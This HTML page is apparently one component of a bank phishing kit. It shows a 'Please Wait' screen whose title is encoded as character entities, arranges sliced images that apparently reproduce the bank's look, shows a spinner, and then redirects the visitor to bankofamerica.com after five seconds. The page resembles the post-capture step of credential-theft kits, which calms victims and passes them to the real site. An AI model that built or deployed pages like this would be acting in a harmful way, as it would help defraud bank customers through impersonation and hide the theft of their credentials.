<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#80;&#108;&#101;&#97;&#115;&#101;&#32;&#87;&#97;&#105;&#116;</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	
			  <html><meta http-equiv="Refresh" content="05; url=https://www.bankofamerica.com/"></html>

<style type="text/css">
div#container
{
	position:relative;
	width: 1215px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<body>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:128px; top:23px; width:230px; height:38px; z-index:0"><a href="#"><img src="images/b4.png" alt="" title="" border=0 width=230 height=38></a></div>

<div id="image2" style="position:absolute; overflow:hidden; left:122px; top:75px; width:968px; height:20px; z-index:1"><img src="images/bo11.png" alt="" title="" border=0 width=968 height=20></div>

<div id="image3" style="position:absolute; overflow:hidden; left:398px; top:130px; width:274px; height:51px; z-index:2"><img src="images/ba21.png" alt="" title="" border=0 width=274 height=51></div>

<div id="image4" style="position:absolute; overflow:hidden; left:114px; top:510px; width:987px; height:150px; z-index:3"><img src="images/bo28.png" alt="" title="" border=0 width=987 height=150></div>

<div id="image5" style="position:absolute; overflow:hidden; left:139px; top:559px; width:108px; height:17px; z-index:4"><a href="#"><img src="images/bo29.png" alt="" title="" border=0 width=108 height=17></a></div>

<div id="image6" style="position:absolute; overflow:hidden; left:500px; top:253px; width:100px; height:100px; z-index:5"><img src="images/wait.gif" alt="" title="" border=0 width=100 height=100></div>

</div>

</body>
</html>
